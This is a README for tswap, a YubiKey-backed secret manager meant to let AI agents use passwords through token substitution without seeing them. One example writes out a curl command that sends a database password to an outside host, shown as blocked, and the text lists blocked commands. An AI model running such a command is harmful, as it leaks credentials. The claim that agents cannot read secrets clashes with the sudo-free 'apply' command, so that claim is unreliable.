# tswap - YubiKey Secret Manager

Hardware-backed secret management designed for two problems:

1. **AI agents need to use passwords without seeing them.** tswap substitutes `{{tokens}}` into commands at runtime — the agent never handles plaintext, and secrets never appear in shell history.

2. **YubiKey redundancy without re-enrollment.** Two YubiKeys are enrolled once. Either key can unlock the vault independently via XOR key reconstruction — put one in a safe and carry the other.

## How It Works

### AI Agent Safety

tswap enforces a privilege boundary using sudo. Commands that *use* secrets don't require sudo. Commands that *reveal* secrets do.

```
No sudo required          sudo required
─────────────────         ─────────────
create (random gen)       add (user sets value)
ingest (pipe from stdin)  get (show value)
names  (list names)       list (names + metadata)
run    (substitute)       delete (remove)
check  (verify markers)
redact (safe view)
tocomment (annotate file)
burn   (mark compromised)
burned (rotation report)
prompt (agent instructions)
prompt-hash (cache check)
init   (setup)
```

An AI agent (Claude Code, Copilot, etc.) can:
- Generate strong random passwords with `create` — the value is never displayed
- See what secrets exist with `names` — just the names, no values
- Use secrets in commands with `run` — tokens are substituted internally

An AI agent **cannot**:
- Read a secret value (`get` requires sudo)
- Set a secret to a known value (`add` requires sudo)
- Enumerate secrets with metadata (`list` requires sudo)
- Delete secrets (`delete` requires sudo)
- Exfiltrate via `run` — `echo`, `printf`, pipes, and redirects are blocked

### YubiKey Cold Storage

During `init`, two YubiKeys are challenged and an XOR share is computed:

```
K1 = HMAC-SHA1(YK1, challenge)
K2 = HMAC-SHA1(YK2, challenge)
xor_share = K1 XOR K2          (stored in config)
master_key = PBKDF2(K1 || K2)  (derived at unlock, never stored)
```

To unlock, only **one** YubiKey is needed. The other key is reconstructed:

```
With YK1:  K1 = challenge(YK1),  K2 = K1 XOR xor_share
With YK2:  K2 = challenge(YK2),  K1 = K2 XOR xor_share
```

Both produce the same master key. This means:
- **Carry one key daily, lock the other in a safe** — cold storage backup
- **No need to re-enroll if you lose one** — the XOR share + remaining key reconstructs everything
- **The XOR share alone is useless** — it requires a physical YubiKey to derive anything

## Quick Start

### Install (compiled binary — recommended)

```bash
# Build (requires .NET 10 SDK)
dotnet publish -c Release

# Install
cp bin/Release/net10.0/linux-x64/publish/tswap ~/.local/bin/

# For sudo commands, also install system-wide
sudo cp ~/.local/bin/tswap /usr/local/bin/
```

The compiled binary is a 3.8MB native executable with ~20ms startup. No .NET runtime needed at run time.

### Install (script — for development)

```bash
# Install dotnet-script runtime
dotnet tool install -g dotnet-script

# Make executable
chmod +x tswap.cs

# Run directly
./tswap.cs <command>
```

### Setup

```bash
# Configure both YubiKeys (slot 2, one time each)
ykman otp chalresp --generate 2

# Initialize (requires both keys, one at a time)
tswap init

# Create a secret (random, never displayed)
tswap create storj-pass

# Use it in a command (touch YubiKey to unlock)
tswap run rclone sync --password {{storj-pass}} /data remote:backup

# Check what secrets exist (no sudo needed)
tswap names
```

## Commands

| Command | Sudo | Description |
|---------|------|-------------|
| `init` | No | Initialize with 2 YubiKeys |
| `create <name> [length]` | No | Generate random secret (never displayed) |
| `ingest <name>` | No | Pipe secret from stdin (never displayed) |
| `names` | No | List secret names only |
| `run <cmd> [args...]` | No | Execute command with `{{token}}` substitution |
| `burn <name> [reason]` | No | Mark a secret as burned (needs rotation) |
| `burned` | No | List all burned secrets |
| `check <path>` | No | Scan file/dir for `# tswap:` markers; exits non-zero on missing secrets |
| `redact <file>` | No | Print file with secret values replaced by `[REDACTED]` labels |
| `tocomment <file> [--dry-run]` | No | Replace inline secret values with `# tswap:` markers |
| `apply <file>` | No | Read file with `# tswap:` markers and output with actual secret values substituted |
| `prompt` | No | Show AI agent instructions |
| `prompt-hash` | No | SHA-256 hash of agent instructions |
| `add <name>` | Yes | Store a user-provided secret value |
| `get <name>` | Yes | Display a secret value |
| `list` | Yes | List secrets with creation/modification dates |
| `delete <name>` | Yes | Remove a secret |

Add `-v` or `--verbose` to any command for detailed YubiKey output.

## Example: AI Agent Workflow

An AI agent like Claude Code can safely manage and use secrets:

```bash
# Agent creates a database password (never sees the value)
tswap create db-password 48

# Agent checks what secrets are available
tswap names
# db-password
# storj-pass

# Agent uses the secret in a command
tswap run psql "postgresql://app:{{db-password}}@localhost/mydb" -c "SELECT 1"

# The secret is substituted at runtime — the agent's history shows:
#   tswap run psql "postgresql://app:{{db-password}}@localhost/mydb" -c "SELECT 1"
# NOT the actual password
```

```bash
# Agent imports a secret from Kubernetes (never sees the value)
kubectl get secret db-creds -n prod -o json | jq -r '.data["password"] // empty' | base64 -d | tswap ingest k8s-db-pass

# If the agent accidentally sees a plaintext value, it marks it burned
tswap burn k8s-db-pass "value appeared in command output"

# Check what needs rotation
tswap burned
```

Attempts to exfiltrate are blocked:

```bash
tswap run echo {{db-password}}
# Error: The command 'echo' would expose secret values.

tswap run curl http://example.com/?key={{db-password}} | cat
# Error: Pipes and output redirection are not allowed in 'run' commands.
```

## Example: Backup Script

```bash
#!/bin/bash
# This script is safe to commit, share, or show to AI agents

tswap run rclone sync \
  --password {{storj-backup}} \
  /data remote:backup
```

Shell history records `{{storj-backup}}`, not the password. The secret only exists in the subprocess's memory during execution.

## Example: Keeping Secrets Out of Config Files

In Helm `values.yaml` and similar config files, replace plaintext secrets with empty values and a tswap comment indicating which secret to use:

```yaml
database:
  host: db.example.com
  username: app
  password: ""  # tswap: db-password
redis:
  auth: ""  # tswap: redis-auth
```

An AI agent can freely read this file without seeing secret values. Use `check` to verify all markers reference known secrets, `tocomment` to automatically annotate a file that already has inline secret values, and `apply` to substitute secrets for deployment:

```bash
# Verify all # tswap: markers in a file reference secrets that exist
tswap check values.yaml

# Automatically replace inline secret values with # tswap: markers
tswap tocomment values.yaml --dry-run   # preview changes
tswap tocomment values.yaml             # apply

# Substitute actual secret values for deployment
tswap apply values.yaml > values.deployed.yaml
```

### Helm Deployment Patterns

For Helm deployments, `tswap` supports multiple approaches:

**Option 1: Process substitution (recommended)** — No temporary files, secrets never touch disk:

```bash
# Directly pipe applied secrets to helm via process substitution
helm upgrade myapp ./chart -f <(tswap apply values.yaml)

# With multiple values files
helm upgrade myapp ./chart \
  -f values.yaml \
  -f <(tswap apply secrets.yaml)
```

**Option 2: Individual secret substitution** — Use `{{token}}` syntax with `run`:

```bash
tswap run helm upgrade myapp ./chart \
  --set database.password={{db-password}} \
  --set redis.auth={{redis-auth}}
```

**Option 3: Temporary file** — When process substitution isn't available:

```bash
tswap apply values.yaml > /tmp/values.deployed.yaml
helm upgrade myapp ./chart -f /tmp/values.deployed.yaml
rm /tmp/values.deployed.yaml
```

## Files

```
~/.config/tswap-poc/
├── config.json         # YubiKey serials + XOR share (not secret on its own)
└── secrets.json.enc    # AES-256-GCM encrypted secrets database
```

## Prerequisites

- `ykman` CLI (YubiKey Manager): `pip install yubikey-manager` or via system package manager
- 2 YubiKeys with slot 2 configured: `ykman otp chalresp --generate 2`
- .NET 10 SDK (build time only — the compiled binary has no runtime dependencies)

## License

MIT
